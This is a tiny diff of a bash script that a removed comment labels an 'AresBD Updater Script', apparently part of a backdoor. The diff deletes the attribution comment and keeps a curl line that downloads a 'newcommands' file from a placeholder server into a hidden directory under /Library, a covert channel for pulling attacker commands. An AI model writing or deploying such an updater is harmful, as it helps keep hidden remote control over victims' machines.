@@ -1,5 +1,4 @@
 #!/bin/bash
-#AresBD Updater Script by Stsosz 
 SERVER=<YOURSERVER>
 
 curl -o /Library/.hidden/newcommands http://$SERVER/newcommands
